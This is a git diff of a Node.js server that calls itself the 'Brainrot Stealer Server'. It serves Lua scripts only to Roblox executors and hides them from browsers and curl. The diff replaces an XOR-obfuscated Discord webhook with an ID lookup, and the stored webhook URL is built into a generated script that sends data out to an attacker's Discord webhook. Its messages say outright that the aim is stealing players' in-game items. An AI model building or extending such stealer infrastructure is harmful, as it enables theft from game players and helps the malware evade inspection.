@@ -2,6 +2,20 @@ const express = require("express");
 const app = express();
 const PORT = process.env.PORT || 3000;
 
+// Simple in-memory storage (use a database in production)
+const webhookStore = new Map();
+const usedIds = new Set();
+
+// Generate unique ID
+function generateUniqueId() {
+    let id;
+    do {
+        id = Math.random().toString(36).substring(2, 10); // 8 character ID
+    } while (usedIds.has(id));
+    usedIds.add(id);
+    return id;
+}
+
 // ------------------------------------------------------------------
 // 1. BLOCK NON-EXECUTORS (browsers, curl, etc.)
 // ------------------------------------------------------------------
@@ -39,68 +53,38 @@ app.get("/", (req, res) => {
 });
 
 // ------------------------------------------------------------------
-// 3. /raw – EXECUTORS ONLY WITH ENCRYPTED WEBHOOK
+// 3. NEW ENDPOINT TO STORE WEBHOOK AND RETURN ID
+// ------------------------------------------------------------------
+app.get("/setup", (req, res) => {
+    const webhook = req.query.wh;
+    
+    if (!webhook || !webhook.startsWith("https://discord.com/api/webhooks/")) {
+        return res.status(400).send("Invalid webhook URL");
+    }
+    
+    // Generate unique ID and store webhook
+    const id = generateUniqueId();
+    webhookStore.set(id, webhook);
+    
+    // Return the ID for use in loadstring
+    res.send(id);
+});
+
+// ------------------------------------------------------------------
+// 4. /raw – EXECUTORS ONLY WITH ID SYSTEM
 // ------------------------------------------------------------------
 app.get("/raw", blockNonExecutor, (req, res) => {
-  const encrypted = req.query.wh;
-  if (!encrypted) return res.status(400).send("-- MISSING DATA --");
+  const id = req.query.id;
+  if (!id) return res.status(400).send("-- MISSING ID --");
 
-  // Multi-layer XOR decryption
-  let webhook = "";
-  try {
-    // First layer XOR
-    const key1 = "brainrot_secure_2024_key1";
-    let layer1 = "";
-    for (let i = 0; i < encrypted.length; i++) {
-      const keyChar = key1.charCodeAt(i % key1.length);
-      const encryptedChar = encrypted.charCodeAt(i);
-      layer1 += String.fromCharCode(encryptedChar ^ keyChar);
-    }
-    
-    // Second layer XOR
-    const key2 = "x7f9!pQz@3mK*vR$5";
-    let layer2 = "";
-    for (let i = 0; i < layer1.length; i++) {
-      const keyChar = key2.charCodeAt(i % key2.length);
-      const layer1Char = layer1.charCodeAt(i);
-      layer2 += String.fromCharCode(layer1Char ^ keyChar);
-    }
-    
-    webhook = Buffer.from(layer2, 'base64').toString('utf-8');
-  } catch {
-    return res.status(400).send("-- INVALID ENCRYPTION --");
+  // Get webhook from storage
+  const webhook = webhookStore.get(id);
+  if (!webhook) {
+    return res.status(404).send("-- INVALID ID --");
   }
 
-  if (!webhook.startsWith("https://discord.com/api/webhooks/")) {
-    return res.status(400).send("-- INVALID WEBHOOK --");
-  }
-
-  // Build Lua script with proper syntax
-  const luaScript = `local EncryptedData = "${encrypted}"
-
--- Webhook Decryption
-local function DecryptWebhook(data)
-    local key1 = "brainrot_secure_2024_key1"
-    local key2 = "x7f9!pQz@3mK*vR$5"
-    
-    local layer1 = ""
-    for i = 1, #data do
-        local keyChar = string.byte(key1, (i - 1) % #key1 + 1)
-        local dataChar = string.byte(data, i)
-        layer1 = layer1 .. string.char(bit32.bxor(dataChar, keyChar))
-    end
-    
-    local layer2 = ""
-    for i = 1, #layer1 do
-        local keyChar = string.byte(key2, (i - 1) % #key2 + 1)
-        local layer1Char = string.byte(layer1, i)
-        layer2 = layer2 .. string.char(bit32.bxor(layer1Char, keyChar))
-    end
-    
-    return game:GetService("HttpService"):JSONDecode('"' .. layer2 .. '"')
-end
-
-local WebhookURL = DecryptWebhook(EncryptedData)
+  // Build Lua script
+  const luaScript = `local WebhookURL = "${webhook}"
 
 -- HTTP Request Function
 local function SendWebhook(url, data)
@@ -480,7 +464,7 @@ print("Ready to steal brainrots!")`;
 });
 
 // ------------------------------------------------------------------
-// 4. CATCH-ALL → 404 + BLACK SCREEN
+// 5. CATCH-ALL → 404 + BLACK SCREEN
 // ------------------------------------------------------------------
 app.use((req, res) => {
   res.status(404).send(`
@@ -491,10 +475,11 @@ app.use((req, res) => {
 });
 
 // ------------------------------------------------------------------
-// 5. START SERVER
+// 6. START SERVER
 // ------------------------------------------------------------------
 app.listen(PORT, () => {
   console.log("Brainrot Stealer Server running on port " + PORT);
   console.log("Ready to steal brainrots!");
   console.log("Website: https://tommyfc555-github-io.onrender.com");
+  console.log("Stored webhooks: " + webhookStore.size);
 });
